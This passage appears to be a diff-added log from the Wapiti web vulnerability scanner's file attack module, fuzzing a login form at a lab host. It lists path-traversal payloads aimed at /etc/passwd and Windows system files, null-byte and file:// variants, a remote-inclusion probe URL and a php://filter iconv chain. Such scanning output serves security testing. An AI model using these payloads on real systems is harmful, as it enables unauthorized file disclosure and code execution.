+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.445 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.455 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.464 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.473 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.481 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.499 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.506 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.514 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=file%3A%2F%2F%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.524 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&password=fuzz
+2024-03-20 14:24:14.537 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.560 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.571 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.582 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=login.php&password=fuzz
+2024-03-20 14:24:14.616 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=login.php%00&password=fuzz
+2024-03-20 14:24:14.628 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=login.php%3A%3A%24DATA&password=fuzz
+2024-03-20 14:24:14.642 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 14:24:14.655 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 14:24:14.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%2Fetc%2Fpasswd
+2024-03-20 14:24:14.676 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%2Fetc%2Fpasswd%00
+2024-03-20 14:24:14.688 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%2Fetc%2Fservices
+2024-03-20 14:24:14.698 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%2Fetc%2Fservices%00
+2024-03-20 14:24:14.709 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 14:24:14.720 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 14:24:14.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 14:24:14.741 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:14.752 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:14.763 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 14:24:14.775 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 14:24:14.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 14:24:14.797 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:14.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:14.819 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:14.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:14.843 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:14.855 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:14.866 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:14.877 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:14.888 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:14.899 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:14.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:14.920 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:14.930 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 14:24:14.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:14.954 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:14.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:14.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:14.979 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:14.990 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:14.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:15.006 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:15.014 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:15.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:15.032 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:15.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:15.049 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:15.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:15.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:15.079 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:15.089 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:15.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:15.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:15.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:15.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:15.137 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:15.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:15.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:15.164 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 14:24:15.174 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 14:24:15.185 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 14:24:15.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 14:24:15.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 14:24:15.214 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 14:24:15.225 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
